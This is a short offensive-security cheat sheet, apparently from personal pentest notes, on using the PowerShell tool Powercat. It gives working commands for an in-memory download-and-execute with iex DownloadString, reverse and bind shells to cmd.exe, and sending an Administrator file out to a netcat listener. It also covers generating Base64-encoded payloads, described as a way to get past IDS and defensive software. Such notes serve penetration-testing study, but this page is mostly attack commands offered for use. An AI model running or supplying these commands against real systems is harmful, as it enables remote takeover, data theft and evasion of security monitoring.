# Powercat

## Powercat Options

```
powercat -h

-l option to create a listener
-c option specifies client mode and sets the listening IP address
-p specifies the port number to connect to
-i indicates the local file that will be transferred remotely
-g option to redirect the output to a file
-e to generate a stand-alone encoded payload
```

## Loading Powercat

```
PS C:> . .\powercat.ps1
```

Note powercat.ps1 loaded as above is only available to the current PowerShell instance

Alternatively, can use `iex` to load downloaded powercat.ps1 script in memory and user powercat directly:

`PS C:> iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.189/powercat.ps1');powercat -c 192.168.119.189 -p 443 -e cmd.exe`

## File Transfer

```
powercat -c 192.168.119.189 -p 443 -i C:\Users\Administrator\file.txt
```

```
sudo nc -lnvp 443 > file.txt
```

## Reverse/Bind Shells

```
powercat -c 192.168.119.189 -p 443 -e cmd.exe
```

```
powercat -l -p 443 -e cmd.exe
```

{% content-ref url="../../collections/reverse-shell/powershell.md" %}
[powershell.md](../../collections/reverse-shell/powershell.md)
{% endcontent-ref %}

{% content-ref url="../../collections/bind-shell/powershell.md" %}
[powershell.md](../../collections/bind-shell/powershell.md)
{% endcontent-ref %}

## Powercat stand-alone payloads

`-g` option

```
PS C:\Users\Administrator> powercat -c 192.168.119.189 -p 443 -e cmd.exe -g > reverseshell.ps1
PS C:\Users\Administrator> ./reverseshell.ps1
```

It’s worth noting that:

* stand-alone payloads like this one might be easily detected by IDS.&#x20;
* the script that is generated is rather large with roughly 300 lines of code.&#x20;
* it also contains a number of hardcoded strings that can easily be used in signatures for malicious activity.&#x20;
* plaintext malicious code such as this will likely have a poor success rate and will likely be caught by defensive software solutions.

### Encoded payloads

We can attempt to overcome this problem by making use of PowerShell’s ability to execute Base64 encoded commands:

`-e` option

```
// reverse shell
PS C:\> powercat -c 192.168.119.189 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1

// bind shell
PS C:\> powercat -l -p 443 -e cmd.exe -ge > encodedbindshell.ps1
```

The file will contain an encoded string that can be executed using the PowerShell -E (EncodedCommand) option. Just need to pass the whole encoded string to powershell.exe -E:

```
PS C:\> powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACA[...]
```
